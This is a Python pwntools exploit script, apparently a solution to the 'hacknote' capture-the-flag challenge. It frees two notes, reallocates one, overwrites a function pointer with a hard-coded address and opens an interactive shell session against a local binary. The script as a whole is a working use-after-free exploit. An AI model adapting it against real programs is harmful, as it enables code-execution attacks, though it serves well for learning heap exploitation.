#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    #  addr = int(raw_input("DEBUG: "), 16)
    raw_input("DEBUG: ")
    gdb.attach(io, "b *add_note")

def Add(size, content):
    io.sendlineafter("choice :", "1")
    debug()
    io.sendlineafter("size :", str(size))
    io.sendlineafter("Content :", content)

def Delete(idx):
    io.sendlineafter("choice :", "2")
    io.sendlineafter("Index :", str(idx))

def Print(idx):
    io.sendlineafter("choice :", "3")
    io.sendlineafter("Index :", str(idx))

def uaf():
    Add(32, "aaaa")
    Add(32, "bbbb")

    Delete(0)
    Delete(1)

    Add(8, p32(0x08048945))

    Print(0)

if __name__ == "__main__":
    io = process("./hacknote")
    uaf()
    io.interactive()
    io.close()

